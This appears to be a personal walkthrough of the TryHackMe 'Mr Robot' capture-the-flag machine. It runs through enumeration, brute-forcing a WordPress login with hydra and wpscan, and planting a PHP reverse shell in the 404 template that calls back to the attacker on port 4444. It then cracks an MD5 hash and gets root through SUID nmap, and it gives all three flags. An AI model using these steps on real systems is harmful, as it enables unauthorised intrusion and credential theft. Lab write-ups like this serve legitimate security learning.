nmap: `nmap -p- --min-rate=1000 -T4  10.10.235.54`

Output:

`Nmap scan report for 10.10.235.54
Host is up (0.13s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https`


Gobuster: `gobuster dir -u http://10.10.235.54 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

Output:

`===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.235.54
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/01 04:06:36 Starting gobuster
===============================================================
/images (Status: 301)
/blog (Status: 301)
/rss (Status: 301)
/sitemap (Status: 200)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)`

Check readme:

Output - `I like where you head is at. However I'm not going to help you.`

Check robots.txt http://10.10.235.54/robots.txt:

Output -
`User-agent: *
fsocity.dic
key-1-of-3.txt`

fsocity.dic file downloaded.

- Seems to be a dictionary.

Go to http://10.10.235.54/key-1-of-3.txt:
`Key 1 = 073403c8a58a1f80d943455fb30724b9`

http://10.10.235.54/0/:
Has a user's blog. There's a login page, but no username anywhere around.

Login Page: http://10.10.235.54/wp-login.php

Dirsearch

dirb

wfuzz

Hydra using fsocity.dic:

hydra -L fsocity.dic -p test 10.10.104.30 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

Username: Elliot
Password: test

hydra -l Elliot -P fsocity.dic 10.10.104.30 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30

--> Hydra took ages.

I then went through the dictionary file and found many duplicates, so I used sort + uniq to shorten the amount (from approx. 900,000 to 11451).

sort fsocity.dic | uniq > fsocity-sorted.txt

Then used wpscan!

wpscan --url http://10.10.185.119 --passwords fsocity-sorted.txt --usernames Elliot -t 50

Output: wpscan-output.txt

Username: Elliot
Password: ER28-0652

They work, log in to Http://10.10.185.119/wp-login.php

Directed to: http://10.10.185.119/wp-admin/

You can upload files, maybe just upload a reverse shell php + access it?

Webshells located in /usr/share/webshells/
we want ./php/php-reverse-shell.php

we just edit IP address, 10.8.82.167, port 4444, and shell /bin/bash.

Had to look this bit up:

1. Edit the site's 404 page:

Appearance, Editor, 404.php
Copy php reverse shell text into here.
Update file.

nc -lvnp 4444 on your Kali machine.

Navigate to a page that will give a 404. You get a reverse shell!

Searched for "key"
`daemon@linux:/$ find / -name *key* 2>/dev/null`

Found: /home/robot/key-2-of-3.txt

So, seems there's a robot user.

/etc/passwd:

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:

Can't read key-2-of-3.txt, only robot can.

In home folder, there's a file:

ls -la /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

Run hashcat to break md5:

kali@kali:~/labs/tryhackme/mr-robot$ hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Sun Jul  5 19:02:53 2020 (1 sec)
Time.Estimated...: Sun Jul  5 19:02:54 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1508.1 kH/s (0.62ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 43008/14344385 (0.30%)
Rejected.........: 0/43008 (0.00%)
Restore.Point....: 39936/14344385 (0.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: promo2007 -> harder

Username : robot
Password: abcdefghijklmnopqrstuvwxyz

su robot, it works!

robot@linux:~$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959

---
Privilege Escalation:

Hint = Nmap

robot@linux:~$ find / -perm -u=s -type f 2>/dev/null

Find all files with SUID bit set.
Output: find-outputl.txt
/usr/local/bin/nmap

Privilege Escalation on nmap:

```
nmap --interactive

nmap > !sh

# whoami
root

# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
